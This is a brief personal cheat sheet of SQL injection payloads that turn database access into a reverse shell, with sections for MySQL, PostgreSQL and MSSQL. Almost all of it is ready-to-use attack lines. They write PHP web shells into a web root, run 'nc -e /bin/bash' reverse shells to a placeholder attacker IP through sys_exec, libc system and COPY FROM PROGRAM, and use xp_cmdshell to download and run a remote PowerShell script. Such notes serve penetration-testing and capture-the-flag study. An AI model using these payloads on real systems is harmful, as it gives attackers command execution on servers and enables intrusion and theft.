# sql

Author: Julien Bongars
Date: 2025-09-20 17:19:28

---

Reverse shell for SQL commands

## MySQL

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

# Direct Shell
' UNION SELECT sys_exec('nc -e /bin/bash YOUR_IP 4444')--
```

## Postgresql

```sql
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

# Using extensions (if enabled):
sql'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
'; SELECT system('nc -e /bin/bash YOUR_IP 4444')--

# use the program arg
' UNION SELECT 1; COPY (SELECT '') FROM PROGRAM 'nc -e /bin/bash YOUR_IP 4444'; --

```

### Additional cracks by col

## MSSQL

```sql
'; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''http://YOUR_IP/shell.ps1'')"'--
```
